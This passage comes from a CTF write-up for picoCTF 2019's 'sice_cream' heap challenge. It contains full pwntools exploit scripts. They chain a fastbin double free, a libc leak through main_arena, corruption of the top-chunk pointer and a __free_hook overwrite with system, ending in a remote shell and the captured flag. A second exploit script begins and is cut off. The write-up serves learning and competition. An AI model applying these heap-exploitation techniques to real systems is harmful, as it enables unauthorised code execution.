<span class="k">def</span> <span class="nf">reintroduce</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'1.'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>

<span class="s">'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''</span>

<span class="c1"># Initialize our name to look like a fake chunk header with size 0x61
</span><span class="n">initialize</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Address of name global variable (PIE is disabled)
</span><span class="n">fake_chunk</span> <span class="o">=</span> <span class="mh">0x602040</span>

<span class="c1"># Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 2
</span>
<span class="c1"># Double free chunk 0
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># Get chunk 0 back, and overwrite it's FD with fake chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 3
</span>
<span class="c1"># Three more frees, chunk 6 will be at name
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 4
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 5
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 6
</span>
<span class="c1"># Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">23</span><span class="p">)</span>

<span class="c1"># Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
</span><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n&lt;main_arena_addr&gt;'
# We just format it correctly to get the leak
</span><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">reintroduce</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate all offsets needed
</span><span class="n">main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x58</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'main arena: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="s">'''
This next step is just crazy. I had no idea how to go about getting a chunk on malloc_hook
due to the 0x58 allocation size constraint. Getting a chunk on __free_hook was out of the
question. I spent about a day trying to do a version of the House of Orange from HITCON
CTF 2016, but failed to do so due to the size constraints again.

The next day, NotDeGhost from redpwn hinted me towards the fact that poortho (the author of
this challenge) had created a similar challenge before, so I looked him up and found a
couple writeups of his challenge hard_heap from HSCTF-6.

Basically, in the main arena of libc, there is a pointer known as the top pointer that
exists right after the fastbins. This pointer essentially points to the memory address
that gets used whenever the top chunk is used to service allocations. If we can change
this top pointer and have it point to some other memory region, any allocations that
need to use the top chunk will now give us allocations at that memory address.

The only restriction is that this new memory address must look similar to what the top chunk
header looks like.

I first tried to get a chunk on malloc_hook, however none of the one_gadgets worked, so I
had to come up with something else.

NotDeGhost again told me that it is possible to get a chunk on free_hook, and I was
dumbstruck. Took me a while but I realized how to do it.

The solution will amaze you for sure.
'''</span>

<span class="c1"># We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 7
</span>
<span class="c1"># We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># Now we free a 0x61 sized chunk to prepare for the fastbin attack
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># This is the address where the 0x602040 address from above looks 16 byte aligned
</span><span class="n">fake_chunk_top</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x6</span>

<span class="c1"># We set our fake chunk's fd pointer to point to our fake chunk in main arena
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_top</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 8
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x3e</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="mh">0x1100</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="mh">0x5</span><span class="p">))</span> <span class="c1"># 9
</span>
<span class="c1"># Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 10
</span>
<span class="c1"># Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array
</span>
<span class="c1"># Address of the fake chunk above the array
</span><span class="n">fake_chunk_above_array</span> <span class="o">=</span> <span class="mh">0x602130</span>

<span class="c1"># Change the name so that it places a fake chunk header right at that address from above
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>

<span class="c1"># Free the fake_chunk at the name
</span><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># Overwrite its fd with the address of our fake chunk above the global array
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_above_array</span><span class="p">))</span>

<span class="c1"># Chunk 12 will be above the global array, zero out a bunch of indexes
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 11
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># 12, Free up indexes 0-10
</span>
<span class="c1"># Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb
</span>
<span class="c1"># Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">51</span><span class="p">):</span>
    <span class="c1"># Allocate using top chunk
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x48</span><span class="p">)</span>

    <span class="c1"># Redo the fastbin attack to get a chunk above the global array
</span>
    <span class="c1"># Free our fake_chunk on the name
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>

    <span class="c1"># Change fd to point to fake_chunk_above_array
</span>    <span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_above_array</span><span class="p">))</span>

    <span class="c1"># Two more allocations, zero out the indexes
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="p">)</span>

<span class="c1"># After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x35</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="c1"># Then just put '/bin/sh\x00' into our name array
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
</span><span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redacted@pico-2019-shell1:~<span class="nv">$ </span>python2 exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/warlock/sice_cream'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  <span class="s1">'./'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/warlock/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak: 0x7f1df256eb78
<span class="o">[</span><span class="k">*</span><span class="o">]</span> main arena: 0x7f1df256eb20
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f1df21aa000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f1df21ef390
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f1df25707a8
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
flag<span class="o">{</span>th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349<span class="o">}</span><span class="err">$</span>
</code></pre></div></div>

<h3 id="other-exploit"><strong>Other Exploit</strong></h3>

<p>This one can actually be ran on a local machine since it doesn’t take nearly as long ^_^</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./sice_cream'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="mi">38495</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic
</span>
<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">reintroduce</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'1.'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>

<span class="s">'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''</span>

<span class="c1"># Initialize our name to look like a fake chunk header with size 0x61
</span><span class="n">initialize</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Address of name global variable (PIE is disabled)
</span><span class="n">fake_chunk</span> <span class="o">=</span> <span class="mh">0x602040</span>

<span class="c1"># Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 2
</span>
<span class="c1"># Double free chunk 0
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># Get chunk 0 back, and overwrite it's FD with fake chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 3
</span>
<span class="c1"># Three more frees, chunk 6 will be at name
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 4
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 5
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 6
</span>
<span class="c1"># Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">23</span><span class="p">)</span>

<span class="c1"># Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
</span><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n&lt;main_arena_addr&gt;'
# We just format it correctly to get the leak
</span><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">reintroduce</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate all offsets needed
</span><span class="n">main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x58</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
